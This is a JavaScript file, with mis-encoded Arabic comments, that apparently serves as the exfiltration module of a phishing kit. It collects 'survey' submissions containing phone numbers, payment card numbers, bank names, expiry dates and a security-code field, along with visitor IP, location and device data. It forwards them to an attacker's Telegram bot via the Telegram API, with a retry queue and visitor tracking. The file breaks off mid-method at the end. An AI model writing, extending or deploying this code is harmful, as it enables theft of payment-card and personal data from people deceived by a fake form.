/**
 * Ù†Ø¸Ø§Ù… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Telegram
 * Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ Ø¹Ù†: Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù€ Telegram APIØŒ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ØŒ Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„ÙƒØ§Ø´
 */

class TelegramBotManager {
    constructor() {
        this.botToken = null;
        this.chatId = null;
        this.isEnabled = false;
        this.queue = [];
        this.isSending = false;
        this.retryAttempts = 3;
        this.retryDelay = 5000; // 5 Ø«ÙˆØ§Ù†ÙŠ
        
        this.init();
    }
    
    init() {
        this.loadConfig();
        this.setupEventListeners();
        this.processQueue();
        this.setupAutoCleanup();
        
        console.log('ğŸ¤– Telegram Bot Manager initialized');
    }
    
    // ====== ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ======
    loadConfig() {
        try {
            // ØªØ­Ù…ÙŠÙ„ Ù…Ù† localStorage
            const config = JSON.parse(localStorage.getItem('telegram_config') || '{}');
            
            this.botToken = config.botToken || '';
            this.chatId = config.chatId || '';
            this.isEnabled = config.enabled || false;
            
            // ØªØ­Ù…ÙŠÙ„ Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
            if (!this.botToken) {
                this.botToken = localStorage.getItem('telegram_bot_token') || '';
            }
            
            if (!this.chatId) {
                this.chatId = localStorage.getItem('telegram_chat_id') || '';
            }
            
            console.log('âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Telegram:', {
                hasToken: !!this.botToken,
                hasChatId: !!this.chatId,
                isEnabled: this.isEnabled
            });
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Telegram:', error);
            this.isEnabled = false;
        }
    }
    
    saveConfig() {
        try {
            const config = {
                botToken: this.botToken,
                chatId: this.chatId,
                enabled: this.isEnabled,
                lastUpdated: new Date().toISOString()
            };
            
            localStorage.setItem('telegram_config', JSON.stringify(config));
            console.log('ğŸ’¾ ØªÙ… Ø­ÙØ¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Telegram');
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Telegram:', error);
        }
    }
    
    updateConfig(botToken, chatId, enabled = true) {
        this.botToken = botToken;
        this.chatId = chatId;
        this.isEnabled = enabled;
        
        this.saveConfig();
        
        // Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø¹Ø¯ Ø§Ù„ØªØ­Ø¯ÙŠØ«
        if (enabled) {
            this.testConnection();
        }
    }
    
    // ====== Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§ØªØµØ§Ù„ ======
    async testConnection() {
        if (!this.botToken || !this.chatId) {
            return {
                success: false,
                message: 'Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Telegram ØºÙŠØ± Ù…ÙƒØªÙ…Ù„Ø©'
            };
        }
        
        try {
            const testMessage = {
                type: 'test',
                message: 'ğŸ”— Ø§Ø®ØªØ¨Ø§Ø± Ø§ØªØµØ§Ù„ Telegram\nØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù‡Ø°Ù‡ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª.',
                timestamp: new Date().toISOString()
            };
            
            const result = await this.sendMessage(testMessage);
            
            if (result.success) {
                return {
                    success: true,
                    message: 'âœ… ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù€ Telegram Ø¨Ù†Ø¬Ø§Ø­!'
                };
            } else {
                return {
                    success: false,
                    message: `âŒ ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„: ${result.error}`
                };
            }
            
        } catch (error) {
            return {
                success: false,
                message: `âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„: ${error.message}`
            };
        }
    }
    
    // ====== Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ ======
    async sendSurveySubmission(data, submissionId) {
        if (!this.isEnabled || !this.botToken || !this.chatId) {
            console.warn('âš ï¸ Telegram ØºÙŠØ± Ù…ÙØ¹Ù„ Ø£Ùˆ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ØºÙŠØ± Ù…ÙƒØªÙ…Ù„Ø©');
            this.saveToQueue(data, submissionId);
            return { success: false, error: 'Telegram ØºÙŠØ± Ù…ÙØ¹Ù„' };
        }
        
        const message = this.formatSurveyMessage(data, submissionId);
        
        try {
            const result = await this.sendTelegramMessage(message);
            
            if (result.success) {
                console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ø¥Ù„Ù‰ Telegram');
                return { success: true, messageId: result.messageId };
            } else {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©:', result.error);
                this.saveToQueue(data, submissionId);
                return { success: false, error: result.error };
            }
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©:', error);
            this.saveToQueue(data, submissionId);
            return { success: false, error: error.message };
        }
    }
    
    async sendVisitorNotification(visitorData) {
        if (!this.isEnabled || !this.botToken || !this.chatId) {
            return { success: false, error: 'Telegram ØºÙŠØ± Ù…ÙØ¹Ù„' };
        }
        
        const message = this.formatVisitorMessage(visitorData);
        
        try {
            const result = await this.sendTelegramMessage(message);
            return result;
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ø²Ø§Ø¦Ø±:', error);
            return { success: false, error: error.message };
        }
    }
    
    async sendAdminNotification(title, message, type = 'info') {
        if (!this.isEnabled || !this.botToken || !this.chatId) {
            return { success: false, error: 'Telegram ØºÙŠØ± Ù…ÙØ¹Ù„' };
        }
        
        const formattedMessage = this.formatAdminMessage(title, message, type);
        
        try {
            const result = await this.sendTelegramMessage(formattedMessage);
            return result;
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„:', error);
            return { success: false, error: error.message };
        }
    }
    
    async sendTelegramMessage(text) {
        if (!this.botToken || !this.chatId) {
            throw new Error('Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Telegram ØºÙŠØ± Ù…ÙƒØªÙ…Ù„Ø©');
        }
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: text,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            
            const data = await response.json();
            
            if (data.ok) {
                return {
                    success: true,
                    messageId: data.result.message_id,
                    chatId: data.result.chat.id,
                    date: data.result.date
                };
            } else {
                throw new Error(data.description || 'Unknown Telegram error');
            }
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Telegram:', error);
            throw error;
        }
    }
    
    // ====== ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ ======
    formatSurveyMessage(data, submissionId) {
        const timestamp = new Date().toLocaleString('ar-EG');
        
        let message = `
ğŸ“‹ <b>Ù…Ø´Ø§Ø±ÙƒØ© Ø¬Ø¯ÙŠØ¯Ø© ÙÙŠ Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†</b>

ğŸ†” <b>Ø±Ù‚Ù… Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©:</b> <code>${submissionId}</code>
ğŸ“ <b>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:</b> <code>${data.phone}</code>
ğŸ’³ <b>Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</b> <code>${data.cardNumber}</code>
ğŸ¦ <b>Ù†ÙˆØ¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</b> ${data.cardType}
ğŸ¢ <b>Ø§Ø³Ù… Ø§Ù„Ø¨Ù†Ùƒ:</b> ${data.bankName}
ğŸ“… <b>ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡:</b> ${data.expiryDate}
ğŸ” <b>Ø±Ù…Ø² Ø§Ù„Ø­Ù…Ø§ÙŠØ©:</b> ***
        
ğŸ“ <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹:</b>
   â”œ Ø§Ù„Ø¨Ù„Ø¯: ${data.location?.country || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${data.location?.region || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${data.location?.city || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”” Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©: ${data.location?.isp || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
        
ğŸ“± <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:</b>
   â”œ Ø§Ù„Ù…ØªØµÙØ­: ${data.deviceInfo?.browser || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${data.deviceInfo?.os || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${data.deviceInfo?.device || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”” Ø§Ù„Ù„ØºØ©: ${data.deviceInfo?.language || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
        
ğŸ• <b>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©:</b> ${timestamp}
ğŸ”— <b>Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹:</b> ${window.location.href}
        `;
        
        return message.trim();
    }
    
    formatVisitorMessage(visitorData) {
        const timestamp = new Date().toLocaleString('ar-EG');
        
        let message = `
ğŸ‘¤ <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø±</b>

ğŸ†” <b>Ù…Ø¹Ø±Ù Ø§Ù„Ø²Ø§Ø¦Ø±:</b> <code>${visitorData.visitorId}</code>
ğŸ†” <b>Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø©:</b> <code>${visitorData.sessionId}</code>
        
ğŸ“ <b>Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ:</b>
   â”œ Ø§Ù„Ø¨Ù„Ø¯: ${visitorData.locationInfo?.country || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${visitorData.locationInfo?.region || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${visitorData.locationInfo?.city || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”” Ø§Ù„Ø¹Ù†ÙˆØ§Ù† IP: <code>${visitorData.locationInfo?.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</code>
        
ğŸ“± <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:</b>
   â”œ Ø§Ù„Ù…ØªØµÙØ­: ${visitorData.deviceInfo?.browser || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${visitorData.deviceInfo?.os || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”œ Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${visitorData.deviceInfo?.device || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
   â”” Ø¯Ù‚Ø© Ø§Ù„Ø´Ø§Ø´Ø©: ${visitorData.deviceInfo?.screenResolution?.width || 0}x${visitorData.deviceInfo?.screenResolution?.height || 0}
        
ğŸ“Š <b>Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø²ÙŠØ§Ø±Ø©:</b>
   â”œ Ø¹Ø¯Ø¯ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª: ${visitorData.visitInfo?.visits || 1}
   â”œ Ø£ÙˆÙ„ Ø²ÙŠØ§Ø±Ø©: ${new Date(visitorData.visitInfo?.firstVisit || Date.now()).toLocaleString('ar-EG')}
   â”” Ø¢Ø®Ø± Ø²ÙŠØ§Ø±Ø©: ${new Date(visitorData.visitInfo?.lastVisit || Date.now()).toLocaleString('ar-EG')}
        
ğŸ• <b>ÙˆÙ‚Øª Ø§Ù„ØªØªØ¨Ø¹:</b> ${timestamp}
ğŸ”— <b>Ø§Ù„ØµÙØ­Ø©:</b> ${window.location.href}
        `;
        
        return message.trim();
    }
    
    formatAdminMessage(title, content, type) {
        const icons = {
            info: 'â„¹ï¸',
            success: 'âœ…',
            warning: 'âš ï¸',
            error: 'âŒ',
            alert: 'ğŸš¨'
        };
        
        const timestamp = new Date().toLocaleString('ar-EG');
        
        let message = `
${icons[type] || icons.info} <b>${title}</b>

${content}
        
ğŸ• <b>Ø§Ù„ÙˆÙ‚Øª:</b> ${timestamp}
ğŸ”— <b>Ø§Ù„Ù…ÙˆÙ‚Ø¹:</b> ${window.location.href}
        `;
        
        return message.trim();
    }
    
    formatErrorMessage(error) {
        const timestamp = new Date().toLocaleString('ar-EG');
        
        let message = `
âŒ <b>Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù…</b>

ğŸ“ <b>Ø§Ù„ÙˆØµÙ:</b>
${error.message || 'Ø®Ø·Ø£ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}

ğŸ“ <b>Ø§Ù„Ù…ÙƒØ§Ù†:</b>
${error.filename || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}:${error.lineno || '?'}:${error.colno || '?'}

ğŸ”— <b>Ø§Ù„ØµÙØ­Ø©:</b> ${window.location.href}
ğŸ• <b>Ø§Ù„ÙˆÙ‚Øª:</b> ${timestamp}
ğŸ‘¤ <b>Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:</b> ${navigator.userAgent.substring(0, 100)}...
        `;
        
        return message.trim();
    }
    
    // ====== Ù†Ø¸Ø§Ù… Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± (Queue) ======
    saveToQueue(data, submissionId = null) {
        try {
            const queueItem = {
                data: data,
                submissionId: submissionId,
                type: 'survey_submission',
                timestamp: new Date().toISOString(),
                attempts: 0,
                lastAttempt: null
            };
            
            this.queue.push(queueItem);
            this.saveQueue();
            
            console.log('ğŸ’¾ ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±');
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±:', error);
        }
    }
    
    saveQueue() {
        try {
            localStorage.setItem('telegram_queue', JSON.stringify(this.queue));
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±:', error);
        }
    }
    
    loadQueue() {
        try {
            const savedQueue = localStorage.getItem('telegram_queue');
            this.queue = savedQueue ? JSON.parse(savedQueue) : [];
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±:', error);
            this.queue = [];
        }
    }
    
    async processQueue() {
        if (this.isSending || this.queue.length === 0) {
            return;
        }
        
        this.isSending = true;
        
        while (this.queue.length > 0) {
            const item = this.queue[0];
            
            if (item.attempts >= this.retryAttempts) {
                // ØªÙ… ØªØ¬Ø§ÙˆØ² Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§ØªØŒ Ù†Ù‚Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø£Ø±Ø´ÙŠÙ
                this.archiveFailedItem(item);
                this.queue.shift();
                continue;
            }
            
            try {
                const result = await this.sendQueueItem(item);
                
                if (result.success) {
                    // Ù†Ø¬Ø§Ø­ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ØŒ Ø­Ø°Ù Ù…Ù† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
                    this.queue.shift();
                    console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¹Ù†ØµØ± Ù…Ù† Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±');
                } else {
                    // ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ØŒ Ø²ÙŠØ§Ø¯Ø© Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª
                    item.attempts++;
                    item.lastAttempt = new Date().toISOString();
                    item.lastError = result.error;
                    
                    // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ø¨Ù„ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
                    await this.delay(this.retryDelay);
                }
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¹Ù†ØµØ± Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±:', error);
                item.attempts++;
                item.lastAttempt = new Date().toISOString();
                item.lastError = error.message;
                
                await this.delay(this.retryDelay);
            }
            
            this.saveQueue();
        }
        
        this.isSending = false;
        
        // Ø¬Ø¯ÙˆÙ„Ø© Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
        setTimeout(() => this.processQueue(), 30000); // ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ©
    }
    
    async sendQueueItem(item) {
        if (!this.isEnabled || !this.botToken || !this.chatId) {
            return { success: false, error: 'Telegram ØºÙŠØ± Ù…ÙØ¹Ù„' };
        }
        
        let message;
        
        switch (item.type) {
            case 'survey_submission':
                message = this.formatSurveyMessage(item.data, item.submissionId);
                break;
            case 'visitor_notification':
                message = this.formatVisitorMessage(item.data);
                break;
            default:
                return { success: false, error: 'Ù†ÙˆØ¹ Ø§Ù„Ø±Ø³Ø§Ù„Ø© ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ' };
        }
        
        try {
            const result = await this.sendTelegramMessage(message);
            return { success: true, ...result };
            
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    archiveFailedItem(item) {
        try {
            let archive = JSON.parse(localStorage.getItem('telegram_failed_archive') || '[]');
            
            archive.push({
                ...item,
                archivedAt: new Date().toISOString()
            });
            
            // Ø­ÙØ¸ ÙÙ‚Ø· Ø¢Ø®Ø± 100 Ø¹Ù†ØµØ± ÙØ§Ø´Ù„
            if (archive.length > 100) {
                archive = archive.slice(-100);
            }
            
            localStorage.setItem('telegram_failed_archive', JSON.stringify(archive));
            console.log('ğŸ“¦ ØªÙ… Ø£Ø±Ø´ÙØ© Ø§Ù„Ø¹Ù†ØµØ± Ø§Ù„ÙØ§Ø´Ù„');
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø£Ø±Ø´ÙØ© Ø§Ù„Ø¹Ù†ØµØ± Ø§Ù„ÙØ§Ø´Ù„:', error);
        }
    }
    
    // ====== ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© ======
    setupAutoCleanup() {
        // ØªÙ†Ø¸ÙŠÙ ÙŠÙˆÙ…ÙŠ
        const lastCleanup = localStorage.getItem('last_telegram_cleanup');
        const today = new Date().toDateString();
        
        if (lastCleanup !== today) {
            this.cleanupOldData();
            localStorage.setItem('last_telegram_cleanup', today);
        }
    }
    
    cleanupOldData() {
        try {
            // ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø£Ø±Ø´ÙŠÙ Ø§Ù„Ù‚Ø¯ÙŠÙ… (Ø£ÙƒØ«Ø± Ù…Ù† 30 ÙŠÙˆÙ…)
            const archive = JSON.parse(localStorage.getItem('telegram_failed_archive') || '[]');
            const thirtyDaysAgo = new Date();
            thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
            
            const filteredArchive = archive.filter(item => {
                const itemDate = new Date(item.archivedAt || item.timestamp);
                return itemDate > thirtyDaysAgo;
            });
            
            localStorage.setItem('telegram_failed_archive', JSON.stringify(filteredArchive));
            
            // ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©
            this.cleanupOldLogs();
            
            console.log('ğŸ§¹ ØªÙ… ØªÙ†Ø¸ÙŠÙ Ø¨ÙŠØ§Ù†Ø§Øª Telegram Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©');
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©:', error);
        }
    }
    
    cleanupOldLogs() {
        try {
            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
            const sevenDaysAgo = new Date();
            sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
            
            const filteredLogs = logs.filter(log => {
                const logDate = new Date(log.timestamp);
                return logDate > sevenDaysAgo;
            });
            
            localStorage.setItem('telegram_logs', JSON.stringify(filteredLogs));
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø³Ø¬Ù„Ø§Øª:', error);
        }
    }
    
    // ====== Ø§Ù„Ø³Ø¬Ù„Ø§Øª ÙˆØ§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª ======
    logMessage(type, data, result) {
        try {
            const log = {
                type: type,
                data: data,
                result: result,
                timestamp: new Date().toISOString(),
                url: window.location.href
            };
            
            let logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
            logs.push(log);
            
            // Ø­ÙØ¸ ÙÙ‚Ø· Ø¢Ø®Ø± 500 Ø³Ø¬Ù„
            if (logs.length > 500) {
                logs = logs.slice(-500);
            }
            
            localStorage.setItem('telegram_logs', JSON.stringify(logs));
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©:', error);
        }
    }
    
    getStatistics() {
        try {
            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
            const queue = this.queue.length;
            const archive = JSON.parse(localStorage.getItem('telegram_failed_archive') || '[]').length;
            
            const today = new Date().toDateString();
            const todayLogs = logs.filter(log => 
                new Date(log.timestamp).toDateString() === today
            );
            
            const successfulLogs = logs.filter(log => 
                log.result && log.result.success === true
            );
            
            const failedLogs = logs.filter(log => 
                log.result && log.result.success === false
            );
            
            return {
                totalMessages: logs.length,
                successfulMessages: successfulLogs.length,
                failedMessages: failedLogs.length,
                successRate: logs.length > 0 ? (successfulLogs.length / logs.length * 100).toFixed(2) : 0,
                todayMessages: todayLogs.length,
                queueLength: queue,
                archivedItems: archive,
                lastMessage: logs.length > 0 ? logs[logs.length - 1].timestamp : null
            };
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­Ø³Ø§Ø¨ Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:', error);
            return {
                totalMessages: 0,
                successfulMessages: 0,
                failedMessages: 0,
                successRate: 0,
                todayMessages: 0,
                queueLength: 0,
                archivedItems: 0,
                lastMessage: null
            };
        }
    }
    
    // ====== Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ØµÙˆØ± ======
    async sendPhoto(photoBlob, caption = '') {
        if (!this.isEnabled || !this.botToken || !this.chatId) {
            return { success: false, error: 'Telegram ØºÙŠØ± Ù…ÙØ¹Ù„' };
        }
        
        try {
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('photo', photoBlob);
            
            if (caption) {
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
            }
            
            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.ok) {
                return {
                    success: true,
                    messageId: data.result.message_id,
                    photoId: data.result.photo[0].file_id
                };
            } else {
                throw new Error(data.description || 'Unknown Telegram error');
            }
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', error);
            return { success: false, error: error.message };
        }
    }
    
    async sendDocument(documentBlob, filename, caption = '') {
        if (!this.isEnabled || !this.botToken || !this.chatId) {
            return { success: false, error: 'Telegram ØºÙŠØ± Ù…ÙØ¹Ù„' };
        }
        
        try {
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('document', documentBlob, filename);
            
            if (caption) {
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
            }
            
            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.ok) {
                return {
                    success: true,
                    messageId: data.result.message_id,
                    documentId: data.result.document.file_id
                };
            } else {
                throw new Error(data.description || 'Unknown Telegram error');
            }
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù:', error);
            return { success: false, error: error.message };
        }
    }
    
    // ====== Ø¯ÙˆØ§Ù„ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø© ======
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    setupEventListeners() {
        // ØªØªØ¨Ø¹ Ø£Ø®Ø·Ø§Ø¡ Ø§Ù„Ø´Ø¨ÙƒØ©
        window.addEventListener('online', () => {
            if (this.queue.length > 0) {
                this.processQueue();
            }
        });
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ Ø¥Ù„Ù‰ Telegram
        window.addEventListener('error', (event) => {
            if (this.isEnabled) {
                const errorMessage = this.formatErrorMessage(event);
                this.sendTelegramMessage(errorMessage).catch(console.error);
            }
        });
    }
    
    // ====== Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø¹Ø§Ù…Ø© ======
    enable() {
        this.isEnabled = true;
        this.saveConfig();
        console.log('âœ… ØªÙ… ØªÙØ¹ÙŠÙ„ Telegram');
    }
    
    disable() {
        this.isEnabled = false;
        this.saveConfig();
        console.log('âŒ ØªÙ… ØªØ¹Ø·ÙŠÙ„ Telegram');
    }
    
    setBotToken(token) {
        this.botToken = token;
        this.saveConfig();
        console.log('ğŸ”‘ ØªÙ… ØªØ­Ø¯ÙŠØ« ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª');
    }
    
    setChatId(chatId) {
        this.chatId = chatId;
        this.saveConfig();
